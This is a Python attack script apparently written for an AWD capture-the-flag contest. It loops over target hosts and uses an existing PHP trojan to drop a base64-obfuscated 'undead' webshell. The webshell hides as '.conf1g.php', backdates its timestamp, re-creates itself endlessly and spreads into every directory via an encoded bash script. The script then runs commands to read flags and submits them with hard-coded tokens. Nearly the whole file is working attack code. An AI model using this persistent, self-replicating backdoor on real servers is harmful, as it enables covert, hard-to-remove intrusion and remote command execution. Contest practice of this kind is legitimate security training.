# -*- coding: utf-8 -*-
# 作者    : 轩昂妄想
# 文件    : test.py
# 时间    : 2022/10/22 18:53
# -----------------------------------------------------------------------------------
import requests
import re
import time

# busi = '''system("echo 'PD9waHAKaWdub3JlX3VzZXJfYWJvcnQodHJ1ZSk7CnNldF90aW1lX2xpbWl0KDApOwp1bmxpbmsoX19GSUxFX18pOwokZmlsZSA9ICcuY29uZjFnLnBocCc7CiRjb2RlID0gJzw/cGhwIGlmKG1kNSgkX0dFVFsicHdkIl0pPT0iY2YzNmE4M2JlN2M0MDM3NmFkYWQ5ZDBhYmIzNmFjYzAiKXtAZXZhbCgkX1BPU1RbYV0pO30gPz4nOwp3aGlsZSAoMSl7CiAgICBmaWxlX3B1dF9jb250ZW50cygkZmlsZSwkY29kZSk7CiAgICBzeXN0ZW0oJ3RvdWNoIC1tIC1kICIyMDIxLTEyLTAxIDA5OjEwOjEyIiAuY29uZjFnLnBocCcpOwogICAgc3lzdGVtKCJlY2hvICdkSEpoZG1WeVpHbHlLQ2tvY0hWemFHUWdJaVF4SWlBK0lDOWtaWFl2Ym5Wc2JDQXlQaVl4TzJadmNpQm1hV3hsSUdsdUlHQnNjeUF0TVdBN1pHOGdhV1lnZEdWemRDQXRaQ0FpSkdacGJHVWlPM1JvWlc0Z1kzQWdKRkJYUkM4dVkyOXVaakZuTG5Cb2NDQWtVRmRFTHlSbWFXeGxPMlZqYUc4Z0lpUlFWMFF2SkdacGJHVWlPM1J5WVhabGNtUnBjaUFpSkdacGJHVWlJQ0lrS0NoMFlXSWdLeUF4SUNBcEtTSTdabWs3Wkc5dVpTazdkSEpoZG1WeVpHbHknIHwgYmFzZTY0IC1kID4gMS5zaCIpOwogICAgJGFzZCA9IHN5c3RlbSgiYmFzaCAxLnNoIik7CiAgICB1c2xlZXAoMTAwMCk7Cn0=' | base64 -d > conf1g.php");'''
busima = '''system("echo 'PD9waHAKaWdub3JlX3VzZXJfYWJvcnQodHJ1ZSk7CnNldF90aW1lX2xpbWl0KDApOwp1bmxpbmsoX19GSUxFX18pOwokZmlsZSA9ICcuY29uZjFnLnBocCc7CiRjb2RlID0gJzw/cGhwIGlmKG1kNSgkX0dFVFsicHdkIl0pPT0iODAwYzE3MzA5NmIzNzhhNGYzYzcyNGYyOWRiMzQwNjkiKXtAZXZhbCgkX1BPU1RbImJ1c2kiXSk7fSA/Pic7CndoaWxlICgxKXsKICAgIGZpbGVfcHV0X2NvbnRlbnRzKCRmaWxlLCRjb2RlKTsKICAgIHN5c3RlbSgndG91Y2ggLW0gLWQgIjIwMjEtMTItMDEgMDk6MTA6MTIiIC5jb25mMWcucGhwJyk7CiAgICBzeXN0ZW0oImVjaG8gJ2RISmhkbVZ5WkdseUtDa29jSFZ6YUdRZ0lpUXhJaUErSUM5a1pYWXZiblZzYkNBeVBpWXhPMlp2Y2lCbWFXeGxJR2x1SUdCc2N5QXRNV0E3Wkc4Z2FXWWdkR1Z6ZENBdFpDQWlKR1pwYkdVaU8zUm9aVzRnWTNBZ0pGQlhSQzh1WTI5dVpqRm5MbkJvY0NBa1VGZEVMeVJtYVd4bE8yVmphRzhnSWlSUVYwUXZKR1pwYkdVaU8zUnlZWFpsY21ScGNpQWlKR1pwYkdVaUlDSWtLQ2gwWVdJZ0t5QXhJQ0FwS1NJN1ptazdaRzl1WlNrN2RISmhkbVZ5WkdseScgfCBiYXNlNjQgLWQgPiAyLnNoIik7CiAgICAkYXNkID0gc3lzdGVtKCJiYXNoIDIuc2giKTsKICAgIHVzbGVlcCg1MDApOwp9Cgo=' | base64 -d > conf1g.php");'''
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"
}

# path1 = "/123.php"  # 小木马位置
# path = "/.conf1g.php?pwd=busi"  # 不死马位置
# path2 = "/conf1g.php"  # 激活不死马

path1 = "/upload/0/file/202210/123.php"  # 小木马位置
path = "/upload/0/file/202210/.conf1g.php?pwd=busi"  # 不死马位置
path2 = "/upload/0/file/202210/conf1g.php"  # 激活不死马

passwd1 = "aaa"  # 小木马密码
passwd = "busi" # 不死马密码

data = {
    passwd1: busima  # 输入命令，按照需要修改(写入不死马)
}

payload = {
    # passwd: 'print_r(readfile(\'/home/ctf/123\'));'  # 输入命令，按照需要修改(不死马)
    passwd: "system('cat /home/ctf/flag');"
}

# 写入不死马
file = open("E://tool/AWD/Network-security-tools/Attack/busi.php", "r", encoding="utf-8").read()  # 本地的不死马文件名
xieru = {
    passwd: "file_put_contents(\"busi.php\",\"" + file + "\");"  # 写入不死马
}

# 读取IP
file = open('../Information collection/ip_result_of_scanning.txt', "r")
ip_list = file.read().splitlines()
file.close()

# ip_list = ["http://192.168.56.135/awd"]  # 目标ip地址

def log(Record_information):
    file = open('log.txt', "a")
    file.write(time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())+'  {}\n'.format(Record_information))
    file.close()

def resume(i):
    global url2
    try:
        url2 = i + path2
        print("正在链接:" + url2)
        response = requests.post(url2, headers=headers, timeout=0.1)  # 写入不死马
        code = response.status_code
        if code != 200:
            print("失去链接:" + url2)
            message = "失去链接:" + url2
            log(message)
    except requests.exceptions.RequestException as e:
        res = re.findall("Read timed out", str(e))
        if res == ['Read timed out']:
            pass
        else:
            print("失去链接:" + url2)
            message = "失去链接:" + url2
            log(message)



def shell(i): # post请求
    try:
        url1 = i + path1
        try:
            print("正在链接:" + url1)
            response1 = requests.post(url1, data=data, headers=headers, timeout=1)  # 链接木马并上传命令
        except requests.exceptions.RequestException as e:
            print("失去链接:" + url1)
            message = "失去链接:" + url1
            log(message)
        # response1 = requests.post(url1, data=xieru, headers=headers, timeout=1)  # 链接木马并上传命令(此项是用来上传其他文件下的不死马)
        try:
            resume(i)
        except requests.exceptions.RequestException as e:
            pass
        url = i + path
        print("正在链接:" + url)
        response = requests.post(url, data=payload, headers=headers, timeout=3)  # 写入不死马
        code = response.status_code
        if code != 200:
            print("失去链接:" + url)
            message = "失去链接:" + url
            log(message)
        try:
            flags = (re.search("flag{.*}", response.text).group(0)[:38])
            print(flags)
            urlflag = "https://ctf.bugku.com/pvp/submit.html?token=f9dc034124f024d1d8faac58fe693382&flag=" + flags
            print(urlflag)
            try:
                results = requests.get("https://ctf.bugku.com/awd/submit.html?token=[token]&flag=[flag]" + flags, headers=headers)
                # print(results.text)
                results = results.text
                result = re.findall("Flag\w\w", results)
                if result == ['Flag正确']:
                    print(results)
                    print("-------------------------------------------------------------------------------------------")
                else:
                    print("flag提交失败！！！")
                    message = i +"\n                     flag提交失败！！！\n                     " + urlflag
                    log(message)
                    print("-------------------------------------------------------------------------------------------")
                    message = "-------------------------------------------------------------------------------------------"
                    log(message)

            except requests.exceptions.RequestException as e:
                print("flag提交失败！！！")
                print("-------------------------------------------------------------------------------------------")
                message = i + "\n                     flag提交失败！！！\n                     " + urlflag
                log(message)
                message = "-------------------------------------------------------------------------------------------"
                log(message)
        except:
            print("没有flag！！！")
            print("-------------------------------------------------------------------------------------------")
       # flag_submit()
       #flag_list(flags)

    except requests.exceptions.RequestException as e:
        print("失去链接:" + url)
        message = "失去链接:" + url1
        log(message)
        message = "-------------------------------------------------------------------------------------------"
        log(message)
        print("-------------------------------------------------------------------------------------------")



path_get = "?shell=print_r(readfile(\'flag\'));"


def shell1(): # get请求
    for i in ip_list:
        try:
            url = i + path_get
            response = requests.get(url, headers=headers, timeout=1)
            url = "https://ctf.bugku.com/pvp/submit.html?token=7622287182f171903fc7d8fc22b880ad&flag=" + str(i)
            flags = (re.search("flag{.*}", response.text).group(0)[:38])
            print(flags)
            flag_list(flags)

        except requests.exceptions.RequestException as e:
            print("失去链接:" + i)
            message = "失去链接:" + i
            log(message)


def flag_submit():
    f = open('flag.txt', "r")
    flag_list = f.read().splitlines()
    for i in flag_list:
        url = "https://ctf.bugku.com/pvp/submit.html?token=7622287182f171903fc7d8fc22b880ad&flag=" + str(i)
        print(url)
        results = requests.get(url)
        print(results.text)
    f.close()


def flag_list(flags):
    flag = open('flag.txt', "a")
    flag.write('{}\n'.format(flags))
    flag.close()


while True:
    for ip in ip_list:
        shell(ip)
        time.sleep(5)
        # shell1()
        #flag_submit()